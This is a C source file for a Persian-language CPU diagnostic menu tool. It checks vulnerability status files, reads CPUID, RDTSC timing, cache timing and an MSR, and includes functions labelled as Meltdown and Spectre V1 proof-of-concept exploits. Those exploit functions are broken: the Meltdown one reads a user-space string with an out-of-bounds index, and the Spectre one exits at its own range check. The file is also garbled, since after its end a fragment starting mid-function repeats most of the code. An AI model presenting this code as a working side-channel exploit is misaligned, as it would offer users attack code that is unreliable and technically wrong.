#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <asm/types.h>
#include <cpuid.h>
#include <x86intrin.h>
#include <signal.h>

#define RED "\033[1;31m"
#define GREEN "\033[1;32m"
#define YELLOW "\033[1;33m"
#define BLUE "\033[1;34m"
#define NC "\033[0m"
#define VULN_PATH "/sys/devices/system/cpu/vulnerabilities/"
#define ARRAY_SIZE 256 * 4096
unsigned char array[ARRAY_SIZE];
char kernel_data[10] = "SECURE123";
void print_banner();
void main_menu();
void check_vulnerabilities();
void read_cpuid_info();
void test_rdtsc();
void analyze_cache_timing();
void read_msr(unsigned int msr_index, const char *name);
int meltdown_exploit();
int spectre_v1_exploit(volatile int *array, unsigned long target);
void sigsegv_handler(int signal) {
    printf("%s خطای دسترسی غیرمجاز دریافت شد.%s\n", RED, NC);
}

int main() {
    signal(SIGSEGV, sigsegv_handler);
    print_banner();
    main_menu();
    return 0;
}
void print_banner() {
    printf("%s madare doki - TOOL %s\n", BLUE, NC);
}
void main_menu() {
    int choice;
    do {
        printf("\n%s=== منو اصلی ===%s\n", YELLOW, NC);
        printf("1.  بررسی آسیب‌پذیری‌ها\n");
        printf("2.  اطلاعات پردازنده\n");
        printf("3. تست RDTSC\n");
        printf("4. آنالیز Cache Timing\n");
        printf("5. تست Meltdown PoC\n");
        printf("6. تست Spectre V1 PoC\n");
        printf("7. خواندن MSRها\n");
        printf("0. خروج\n");
        printf("انتخاب کنید: ");
        scanf("%d", &choice);
        switch (choice) {
            case 1: check_vulnerabilities(); break;
            case 2: read_cpuid_info(); break;
            case 3: test_rdtsc(); break;
            case 4: analyze_cache_timing(); break;
            case 5: meltdown_exploit(); break;
            case 6: {
                volatile int dummy = spectre_v1_exploit(array, (unsigned long)kernel_data);
                (void)dummy; 
                break;
            }
            case 7: read_msr(0x1A0, "IA32_MISC_ENABLE"); break;
            case 0: printf("خروج...\n"); break;
            default: printf(" انتخاب نامعتبر.\n");
        }

    } while (choice != 0);
}
void check_vulnerabilities() {
    printf("%s بررسی وضعیت آسیب‌پذیری‌ها%s\n", BLUE, NC);
    const char *vulns[] = {"spectre_v1", "spectre_v2", "meltdown", "spectre_bhi"};
    for (int i = 0; i < 4; i++) {
        char path[256];
        snprintf(path, sizeof(path), "%s%s", VULN_PATH, vulns[i]);
        FILE *fp = fopen(path, "r");
        if (!fp) {
            printf(" %s: فایل وجود ندارد یا بدون دسترسی\n", vulns[i]);
            continue;
        }
        char line[256];
        if (fgets(line, sizeof(line), fp)) {
            printf(" %s: %s", vulns[i], line);
        }
        fclose(fp);
    }
}
void read_cpuid_info() {
    unsigned int eax, ebx, ecx, edx;
    __cpuid(0, eax, ebx, ecx, edx);
    char vendor[13];
    memcpy(&vendor[0], &ebx, 4);
    memcpy(&vendor[4], &edx, 4);
    memcpy(&vendor[8], &ecx, 4);
    vendor[12] = '\0';
    printf(" Vendor ID     : %s\n", vendor);
    char brand[49];
    for (int i = 0x80000002; i <= 0x80000004; ++i) {
        __cpuid(i, eax, ebx, ecx, edx);
        memcpy(brand + (i - 0x80000002) * 16 + 0, &eax, 4);
        memcpy(brand + (i - 0x80000002) * 16 + 4, &ebx, 4);
        memcpy(brand + (i - 0x80000002) * 16 + 8, &ecx, 4);
        memcpy(brand + (i - 0x80000002) * 16 + 12, &edx, 4);
    }
    brand[48] = '\0';
    printf(" Model Name    : %s\n", brand);
}
void test_rdtsc() {
    printf("%s تست سرعت RDTSC:%s\n", YELLOW, NC);
    unsigned long long t1 = __rdtsc();
    usleep(1000); // sleep 1ms
    unsigned long long t2 = __rdtsc();
    printf("زمان گذشته: %llu cycle\n", t2 - t1);
}
void analyze_cache_timing() {
    printf("%s آنالیز Cache Timing%s\n", BLUE, NC);
    for (int i = 0; i < 256; i++) {
        unsigned long long time1, time2;
        _mm_clflush(&array[i * 4096]);
        time1 = __rdtsc();
        (void)array[i * 4096];
        time2 = __rdtsc() - time1;
        printf("آدرس %d: زمان دسترسی = %llu cycle\n", i, time2);
    }
}
void read_msr(unsigned int msr_index, const char *name) {
    int fd = open("/dev/cpu/0/msr", O_RDONLY);
    if (fd < 0) {
        printf("%s MSR: دسترسی به /dev/cpu/0/msr غیرممکن (Root نیاز است)%s\n", RED, NC);
        return;
    }
    unsigned long long val;
    if (pread(fd, &val, sizeof(val), msr_index) != sizeof(val)) {
        perror("pread");
        close(fd);
        return;
    }
    printf("%s MSR[%s]: 0x%016llx%s\n", GREEN, name, val, NC);
    close(fd);
}
int meltdown_exploit() {
    printf("%s تست اکسپلویت Meltdown%s\n", YELLOW, NC);
    if (geteuid() != 0) {
        printf("%s شما روت نیستید. دسترسی به حافظه هسته ندارید.%s\n", RED, NC);
        return -1;
    }
    for (size_t i = 0; i < ARRAY_SIZE; i++)
        array[i] = 1;
    for (size_t i = 0; i < 256; i++)
        _mm_clflush(&array[i * 4096]);
    unsigned long long time1, time2;
    int i;
    register uint64_t dummy;
    unsigned long addr = (unsigned long)kernel_data;
    dummy = array[addr * 4096];
    for (i = 0; i < 256; i++) {
        time1 = __rdtsc();
        dummy = array[i * 4096];
        time2 = __rdtsc() - time1;
        if (time2 < 200) {
            printf("%s داده بدست آمده: %c (%d)%s\n", GREEN, i, i, NC);
            return i;
        }
    }
    printf("%s اکسپلویت شکست خورد (احتمال وجود پچ امنیتی)%s\n", YELLOW, NC);
    return -1;
}
int spectre_v1_exploit(volatile int *array, unsigned long target) {
    printf("% sExpluit test  Spectre V1%s\n", YELLOW, NC);
    if (target >= 256) {
        printf("Target out of range\n");
        return -1;
    }
    for (int i = 0; i < 256; i++)
        _mm_clflush(&array[i * 4096]);
    for (int i = 0; i < 10; i++)
        array[i * 4096] = 1;
    array[target * 4096] = 1;
    for (int i = 0; i < 256; i++) {
        unsigned long long time = __rdtsc();
        (void)array[i * 4096];
        time = __rdtsc() - time;
        if (time < 200)
            printf("Found cached value at index %d\n", i);
    }

    return 0;
}
        if (!fp) {
            printf(" %s: فایل وجود ندارد یا بدون دسترسی\n", vulns[i]);
            continue;
        }
        char line[256];
        if (fgets(line, sizeof(line), fp)) {
            printf(" %s: %s", vulns[i], line);
        }
        fclose(fp);
    }
}
void read_cpuid_info() {
    unsigned int eax, ebx, ecx, edx;
    __cpuid(0, eax, ebx, ecx, edx);
    char vendor[13];
    memcpy(&vendor[0], &ebx, 4);
    memcpy(&vendor[4], &edx, 4);
    memcpy(&vendor[8], &ecx, 4);
    vendor[12] = '\0';
    printf(" Vendor ID     : %s\n", vendor);
    char brand[49];
    for (int i = 0x80000002; i <= 0x80000004; ++i) {
        __cpuid(i, eax, ebx, ecx, edx);
        memcpy(brand + (i - 0x80000002) * 16 + 0, &eax, 4);
        memcpy(brand + (i - 0x80000002) * 16 + 4, &ebx, 4);
        memcpy(brand + (i - 0x80000002) * 16 + 8, &ecx, 4);
        memcpy(brand + (i - 0x80000002) * 16 + 12, &edx, 4);
    }
    brand[48] = '\0';
    printf(" Model Name    : %s\n", brand);
}
void test_rdtsc() {
    printf("%s تست سرعت RDTSC:%s\n", YELLOW, NC);
    unsigned long long t1 = __rdtsc();
    usleep(1000); // sleep 1ms
    unsigned long long t2 = __rdtsc();
    printf("زمان گذشته: %llu cycle\n", t2 - t1);
}
void analyze_cache_timing() {
    printf("%s آنالیز Cache Timing%s\n", BLUE, NC);
    for (int i = 0; i < 256; i++) {
        unsigned long long time1, time2;
        _mm_clflush(&array[i * 4096]);
        time1 = __rdtsc();
        (void)array[i * 4096];
        time2 = __rdtsc() - time1;
        printf("آدرس %d: زمان دسترسی = %llu cycle\n", i, time2);
    }
}
void read_msr(unsigned int msr_index, const char *name) {
    int fd = open("/dev/cpu/0/msr", O_RDONLY);
    if (fd < 0) {
        printf("%s MSR: دسترسی به /dev/cpu/0/msr غیرممکن (Root نیاز است)%s\n", RED, NC);
        return;
    }
    unsigned long long val;
    if (pread(fd, &val, sizeof(val), msr_index) != sizeof(val)) {
        perror("pread");
        close(fd);
        return;
    }
    printf("%s MSR[%s]: 0x%016llx%s\n", GREEN, name, val, NC);
    close(fd);
}
int meltdown_exploit() {
    printf("%s تست اکسپلویت Meltdown%s\n", YELLOW, NC);
    if (geteuid() != 0) {
        printf("%s شما روت نیستید. دسترسی به حافظه هسته ندارید.%s\n", RED, NC);
        return -1;
    }
    for (size_t i = 0; i < ARRAY_SIZE; i++)
        array[i] = 1;
    for (size_t i = 0; i < 256; i++)
        _mm_clflush(&array[i * 4096]);
    unsigned long long time1, time2;
    int i;
    register uint64_t dummy;
    unsigned long addr = (unsigned long)kernel_data;
    dummy = array[addr * 4096];
    for (i = 0; i < 256; i++) {
        time1 = __rdtsc();
        dummy = array[i * 4096];
        time2 = __rdtsc() - time1;
        if (time2 < 200) {
            printf("%s داده بدست آمده: %c (%d)%s\n", GREEN, i, i, NC);
            return i;
        }
    }
    printf("%s اکسپلویت شکست خورد (احتمال وجود پچ امنیتی)%s\n", YELLOW, NC);
    return -1;
}
int spectre_v1_exploit(volatile int *array, unsigned long target) {
    printf("% sExpluit test  Spectre V1%s\n", YELLOW, NC);
    if (target >= 256) {
        printf("Target out of range\n");
        return -1;
    }
    for (int i = 0; i < 256; i++)
        _mm_clflush(&array[i * 4096]);
    for (int i = 0; i < 10; i++)
        array[i * 4096] = 1;
    array[target * 4096] = 1;
    for (int i = 0; i < 256; i++) {
        unsigned long long time = __rdtsc();
        (void)array[i * 4096];
        time = __rdtsc() - time;
        if (time < 200)
            printf("Found cached value at index %d\n", i);
    }

    return 0;
}
